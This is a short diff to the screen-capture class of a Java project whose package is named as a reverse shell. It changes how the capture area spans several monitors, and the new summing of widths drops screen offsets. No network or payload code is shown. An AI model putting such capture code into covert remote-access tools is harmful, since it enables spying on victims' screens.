@@ -3,6 +3,7 @@ package obs1d1anc1ph3r.reverseshell;
 import java.awt.*;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayOutputStream;
+import java.io.File;
 import java.io.IOException;
 import java.util.logging.Level;
 import java.util.logging.Logger;
@@ -11,6 +12,7 @@ import javax.imageio.ImageIO;
 public class ScreenShot {
 
     private static final Robot robot;
+
     static {
         try {
             robot = new Robot();
@@ -25,20 +27,17 @@ public class ScreenShot {
             GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
             GraphicsDevice[] screens = ge.getScreenDevices();
 
-            int minX = Integer.MAX_VALUE, minY = Integer.MAX_VALUE;
-            int maxX = Integer.MIN_VALUE, maxY = Integer.MIN_VALUE;
+            Rectangle allScreenBounds = new Rectangle();
             for (GraphicsDevice screen : screens) {
-                Rectangle bounds = screen.getDefaultConfiguration().getBounds();
-                minX = Math.min(minX, bounds.x);
-                minY = Math.min(minY, bounds.y);
-                maxX = Math.max(maxX, bounds.x + bounds.width);
-                maxY = Math.max(maxY, bounds.y + bounds.height);
+                Rectangle screenBounds = screen.getDefaultConfiguration().getBounds();
+                allScreenBounds.width += screenBounds.width;
+                allScreenBounds.height = Math.max(allScreenBounds.height, screenBounds.height);
             }
 
-            Rectangle captureRect = new Rectangle(minX, minY, maxX - minX, maxY - minY);
-            BufferedImage screenshot = robot.createScreenCapture(captureRect);
+            BufferedImage capture = robot.createScreenCapture(allScreenBounds);
+
             try (ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream()) {
-                ImageIO.write(screenshot, "png", byteArrayOutputStream);
+                ImageIO.write(capture, "png", byteArrayOutputStream);
                 return byteArrayOutputStream.toByteArray();
             }
 
